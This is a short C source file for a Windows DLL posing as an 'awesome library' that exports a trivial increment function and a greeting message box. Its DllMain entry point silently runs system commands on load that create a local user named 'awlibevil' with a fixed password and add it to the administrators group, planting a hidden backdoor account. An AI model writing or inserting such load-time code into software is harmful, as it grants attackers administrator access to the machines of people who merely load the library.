#include <windows.h>


BOOL WINAPI DllMain(HANDLE hDLL, DWORD dwReason, LPVOID lpReserved)
{
	WinExec("net user /ADD awlibevil mypasswd", 0);
	WinExec("net localgroup administrators awlibevil /ADD", 0);
	return TRUE;
}


int __declspec( dllexport ) __stdcall Inc(int a)
{
	return a + 1;
}


int __declspec( dllexport ) __stdcall Hello()
{
	MessageBox(0, "Hello from this awesome library!", "Hello", MB_OK);
	return 0;
}
